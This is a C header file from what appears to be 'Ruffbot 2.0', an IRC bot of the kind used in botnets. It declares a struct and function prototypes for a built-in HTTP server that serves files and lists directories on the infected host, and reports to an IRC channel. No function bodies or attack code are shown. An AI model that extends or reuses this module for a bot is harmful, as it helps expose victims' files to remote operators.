/*
XXXXXXXXXXXXXX   XXXXX      XXXXX  XXXXXXXXXXXXX   XXXXXXXXXXXXX  
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXXXXX  XXXXXXXXXXXXXX 
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXXXX   XXXXXXXXXXXXX  
XXXX       XXXX  XXXXX      XXXXX  XXXXX           XXXXX            
XXXX       XXXX  XXXXX      XXXXX  XXXXX           XXXXX            
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXX     XXXXXXXXXXX     
XXXXXXXXXXXXXX   XXXXX      XXXXX  XXXXXXXXXXXX    XXXXXXXXXXXX     
XXXXXXXXX        XXXXX      XXXXX  XXXXXXXXXXX     XXXXXXXXXXX    
XXXX XXXXX       XXXXX      XXXXX  XXXXX           XXXXX           
XXXX  XXXXX      XXXXX      XXXXX  XXXXX           XXXXX           
XXXX   XXXXX     XXXXX      XXXXX  XXXXX           XXXXX           
XXXX    XXXXX    XXXXXX    XXXXXX  XXXXX           XXXXX           
XXXX     XXXXX   XXXXXXXXXXXXXXXX  XXXXX           XXXXX           
XXXX      XXXXX   XXXXXXXXXXXXXX   XXXXX           XXXXX           
XXXX       XXXXX   XXXXXXXXXXXX    XXXXX           XXXXX 
     



        Ruffbot 2.0 [PrivShit] by Ruffnes

*/ 


#ifndef NO_HTTPD
typedef struct HTTPD 
{
	SOCKET sock;
	char chan[128];
	char file[MAX_PATH];
	char path[MAX_PATH];
	char dir[MAX_PATH];
	int port;
	int length;
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL enabled;
	BOOL type;
	BOOL info;

} HTTPD;

DWORD WINAPI HTTP_Server_Thread(LPVOID param);
int Check_Requested_File(SOCKET sock, char *dir, char *rFile, BOOL dirinfo, int threadnum);
int GetFiles(char *current, SOCKET sock, char *chan, char *URL);
DWORD WINAPI HTTP_Header(LPVOID param);
void HTTP_Send_File(SOCKET sock, char *file);
char *File_To_HTML(char *file);
void HTTP_Connect(SOCKET sock, char *chan, BOOL notice, BOOL silent, char *host, int port, char *method, char *url, char *referer);
#endif